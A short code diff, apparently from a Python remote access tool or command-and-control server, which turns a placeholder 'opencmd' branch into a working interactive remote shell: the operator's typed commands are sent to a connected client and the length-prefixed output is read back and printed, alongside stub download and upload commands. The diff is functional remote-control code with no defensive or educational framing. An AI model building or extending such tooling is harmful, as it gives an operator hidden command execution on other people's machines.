@@ -172,13 +172,26 @@ def command_handler(cl_addr, cl_socket):
                 cl_socket.close()
                 clients.pop(cl_addr, None)
                 return
-               
+            
             elif cmd == "opencmd":
-                print("cmd logic")
+                cl_socket.send(cmd.encode())
+                print(f"{green}[*]{reset} CMD session started, type 'exit' to close.")
+                while True:
+                    cmd_input = input(f"{blue}{ip}:{port}>{reset} {cyan}[CMD] >{reset} ")
+                    if cmd_input.lower() == "exit":
+                        break
+                    cl_socket.send(cmd_input.encode())
+                    data = cl_socket.recv(4)
+                    if not data:
+                        break
+                    response_size = struct.unpack(">I", data)[0]
+                    response_data = cl_socket.recv(response_size).decode()
+                    print(response_data)
             elif cmd == "download":
                 print("download logic")
             elif cmd == "upload":
                 print("upload logic")
+
             elif cmd == "getip":
                 cl_socket.send(cmd.encode())
                 while True:
